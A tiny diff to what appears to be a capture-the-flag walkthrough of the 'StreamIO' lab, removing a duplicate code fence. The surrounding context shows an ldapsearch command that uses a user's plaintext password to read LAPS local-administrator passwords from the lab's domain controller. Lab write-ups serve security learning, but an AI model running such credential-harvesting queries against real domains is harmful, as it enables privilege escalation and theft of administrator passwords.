@@ -560,7 +560,6 @@ The command completed successfully.
 ```
 - get `LAPS` using `ldapsearch`
 ```bash
-```bash
 $ ldapsearch -H ldap://streamio.htb -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 # extended LDIF
 #
